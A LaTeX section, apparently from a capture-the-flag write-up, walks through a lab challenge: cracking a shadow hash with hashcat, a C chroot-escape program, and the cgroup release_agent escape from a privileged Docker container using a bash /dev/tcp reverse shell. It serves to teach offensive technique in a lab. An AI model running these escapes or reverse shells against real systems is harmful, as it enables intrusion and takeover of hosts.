@@ -1,0 +1,113 @@
+\documentclass[../main.tex]{subfiles}
+
+\begin{document}
+\section{Misc Challenges}
+\subsection{Briefing}
+Welcome, \textbf{infiltrator}. You've infiltrated a vote counting facility, and now you must escape. You've been given a \textbf{key} which you used to get inside. You will have to break out from the inside. Before you leave, you must get a valuable file: \textbf{flag.txt}. You will find this file in the outer layer of the facility.
+
+\subsection{Walkthrough}
+\subsubsection{foothold}
+The foothold is trivial since we were given the private key and a hint to the username (infiltrator)
+We can ssh into the machine with \lstinline{ssh -i stolenkey infiltrator@ip}.
+\subsubsection{enumeration}
+The first thing we notice is that the username is different from what we ssh'ed with. "chrooter". This might be a hint that we're in a chroot jail. \href{https://stackoverflow.com/questions/75182/detecting-a-chroot-jail-from-within}{there are ways to detect a chroot environment}, but that specific method would give similar results in a docker container. Other methods rely on /proc/mountinfo, but that doesn't seem to be present on our current system, which is also an indication that this isn't a normal system. We'll have to assume that we're in a chroot.
+
+Before we can try and escape the chroot, we need root privileges. If we enumerate the filesystem we see that /etc/shadow is world-readable. Root does not have a password, but the creature does. 
+
+\subsubsection{cracking}
+Because we (apparently) can not use sftp to download the password files, it's easier to copy the hash from the terminal (in our case it starts with \$6\$ and ends with /1) and use it with hashcat and the \href{https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt}{rockyou} wordlist \emph{It's recommended to run hashcat natively because it will be much, much faster}.
+
+\begin{lstlisting}
+./hashcat -m1800 -O -a 0 -o cracked.txt '$6$jkzT4lf.j4waXBTz$FbaqyGF2eDOzqx6fYxpNgcJ54PAGuHtE8Tgxw37OtTpL3icdE34.zrFBDbmt703gBYnef4i65L9rDf23rwSf/1' rockyou.txt
+\end{lstlisting}
+Now we can find the cracked passwords in the cracked.txt file:
+\begin{lstlisting}
+cat cracked.txt
+$6$jkzT4lf.j4waXBTz$FbaqyGF2eDOzqx6fYxpNgcJ54PAGuHtE8Tgxw37OtTpL3icdE34.zrFBDbmt703gBYnef4i65L9rDf23rwSf/1:maga
+\end{lstlisting}
+So, the password is 'maga'.
+\subsubsection{privilege escalation}
+With the password we can start a root shell with \lstinline{sudo -i}.
+
+Now that we have root access, we can break out using a simple C program, since gcc is available in this environment.
+
+\begin{lstlisting}[language=bash]
+cat << EOF > escape.c
+#include <sys/stat.h>
+#include <stdlib.h>
+#include <unistd.h>
+int main(void)
+{
+mkdir("chroot-dir", 0755);
+chroot("chroot-dir");
+for(int i = 0; i < 1000; i++) {
+chdir("..");
+}
+chroot(".");
+system("/bin/bash");
+}
+EOF
+\end{lstlisting}
+We can compile it with:
+\begin{lstlisting}
+gcc -o escape escape.c
+\end{lstlisting}
+and then execute it like so:
+\begin{lstlisting}
+./escape
+\end{lstlisting}
+\subsubsection{enumeration II}
+To check if we escaped we can do \lstinline{ls /root} to see if the escape.c program we just made is in there. It's not, so it's not the same /root we were just in.
+\lstinline{ls /} reveals the jail/ directory we just escaped from. key.txt is nowhere to be found. So we probably didn't completely escape. We can at least check if we're stuck in another chroot. This time, /proc does seem properly populated, so we can use this script:
+\begin{lstlisting}[language=bash]
+if [ "$(stat -c %d:%i /)" != "$(stat -c %d:%i /proc/1/root/.)" ]; then
+  echo "We are chrooted!"
+else
+  echo "Business as usual"
+fi
+\end{lstlisting}
+It seems we aren't chrooted. Next, we can check for docker with
+\begin{lstlisting}
+cat /proc/1/cgroups
+\end{lstlisting}
+This shows a lot of docker entries. It seems we're expected to escape docker. This \emph{is} possible if the docker runs in privileged mode. We can check this by doing something a normal docker container wouldn't be able to do, like creating a network interface.
+\begin{lstlisting}[language=bash]
+apt update -y
+apt install iproute2 -y
+ip link add dummy0 type dummy >/dev/null
+if [[ $? -eq 0 ]]; then
+    PRIVILEGED=true
+    # clean the dummy0 link
+    ip link delete dummy0 >/dev/null
+else
+    PRIVILEGED=false
+fi
+echo $PRIVILEGED
+\end{lstlisting}
+\subsubsection{privilege escalation II}
+Now that we confirmed that our container is privileged, we can break out of it. 
+First, we'll have to set up a reverse shell on our machine
+\begin{lstlisting}
+apt install -y netcat
+nc –lvp 4444
+\end{lstlisting}
+Then we'll have to connect to our netcat with the host that is running our container with this command:
+\begin{lstlisting}
+bash -i >& /dev/tcp/LOCALIPHERE/4444 0>&1
+\end{lstlisting}
+We can execute this command through an exploit
+The full details of this exploit can be found \href{https://medium.com/better-programming/escaping-docker-privileged-containers-a7ae7d17f5a1}{here}
+
+\begin{lstlisting}[language=bash]
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+echo '#!/bin/bash' > /cmd
+## PUT REVERSE SHELL HERE
+echo '/bin/bash -i >& /dev/tcp/LOCALIPHERE/4444 0>&1' >> /cmd
+chmod a+x /cmd
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+\end{lstlisting}
+After this we should have a shell on our second terminal, and we can retrieve the key.
+\end{document}
